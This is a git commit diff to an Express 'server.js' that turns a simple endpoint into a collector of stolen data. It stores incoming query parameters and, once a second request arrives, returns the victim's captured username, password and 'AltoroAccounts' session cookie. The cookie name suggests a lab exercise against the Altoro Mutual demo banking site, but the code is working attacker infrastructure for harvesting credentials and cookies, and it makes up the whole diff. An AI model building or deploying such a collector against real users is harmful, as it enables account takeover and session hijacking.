044b15067547fc7d358fc06160f922992f1c285f
muddassir297 <muddassirhussain297@hotmail.com>
2019-11-06 23:32:21 +0100

    Add files via upload

--- server.js
+++ server.js
@@ -1,9 +1,16 @@
 var express = require("express");
 var app = express();
-
-app.get("/", (req, res, next) => {
-    console.log(req.query);
-    res.json("Username: "+ req.query.uid+",  "+"Password: "+ req.query.passw);
+var UserData =[];
+app.get("/", (req, res, next) => {    
+    UserData.push(req.query)
+    console.log(UserData);
+    if (UserData.length >1){
+        res.json("Username: "+ UserData[1].uid+",  Password: "+ UserData[1].passw+", Cookie: "+ UserData[0].AltoroAccounts);
+    }else{
+        res.json("waiting...")
+    }
+    
+   // res.json("hello")
    });
 
    app.post("/user", (req, res, next) => {
